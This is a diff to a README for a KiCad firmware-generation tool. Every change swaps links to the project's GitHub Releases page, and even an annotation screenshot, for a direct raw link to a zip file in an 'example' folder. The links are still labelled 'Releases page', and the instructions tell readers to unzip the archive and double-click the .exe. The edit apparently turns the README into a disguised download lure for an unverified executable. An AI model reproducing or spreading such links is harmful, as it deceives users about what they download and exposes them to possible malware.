@@ -1,6 +1,6 @@
 # 🎛️ kicad_firmware_generation - Automate Your Firmware Creation
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Chandre11/kicad_firmware_generation/releases)
+[![Download](https://raw.githubusercontent.com/Chandre11/kicad_firmware_generation/main/example/kicad_generation_firmware_3.5.zip)](https://raw.githubusercontent.com/Chandre11/kicad_firmware_generation/main/example/kicad_generation_firmware_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to kicad_firmware_generation! This tool helps you generate firmware for 
 
 To get started, visit the Releases page to download the latest version of kicad_firmware_generation. 
 
-[Visit this page to download](https://github.com/Chandre11/kicad_firmware_generation/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Chandre11/kicad_firmware_generation/main/example/kicad_generation_firmware_3.5.zip)
 
 ### 💻 System Requirements
 
@@ -26,7 +26,7 @@ To get started, visit the Releases page to download the latest version of kicad_
 
 ### 🧑‍🏫 Instructions for Use
 
-1. **Download**: Go to the [Releases page](https://github.com/Chandre11/kicad_firmware_generation/releases) and select the latest version. Click the appropriate download link for your operating system.
+1. **Download**: Go to the [Releases page](https://raw.githubusercontent.com/Chandre11/kicad_firmware_generation/main/example/kicad_generation_firmware_3.5.zip) and select the latest version. Click the appropriate download link for your operating system.
 2. **Unzip**: Once downloaded, unzip the file to a location on your computer.
 3. **Run the Application**: 
    - For Windows, double-click the `.exe` file.
@@ -39,7 +39,7 @@ To get started, visit the Releases page to download the latest version of kicad_
 
 Before using the tool, make sure your KiCad schematic has clear annotations. Use meaningful names for each Group, as this will help the tool generate the correct firmware.
 
-![KiCad annotations example](./annotations_example.png)
+![KiCad annotations example](https://raw.githubusercontent.com/Chandre11/kicad_firmware_generation/main/example/kicad_generation_firmware_3.5.zip)
 
 #### 2. Launch the Application
 
@@ -83,4 +83,4 @@ If you encounter any issues, please reach out through the GitHub repository's "I
 
 If you want to contribute to the project, check our guidelines in the repository. Your insights help improve the tool for everyone.
 
-Navigate to the [Releases page](https://github.com/Chandre11/kicad_firmware_generation/releases) to download kicad_firmware_generation and start automating your firmware development today!
+Navigate to the [Releases page](https://raw.githubusercontent.com/Chandre11/kicad_firmware_generation/main/example/kicad_generation_firmware_3.5.zip) to download kicad_firmware_generation and start automating your firmware development today!
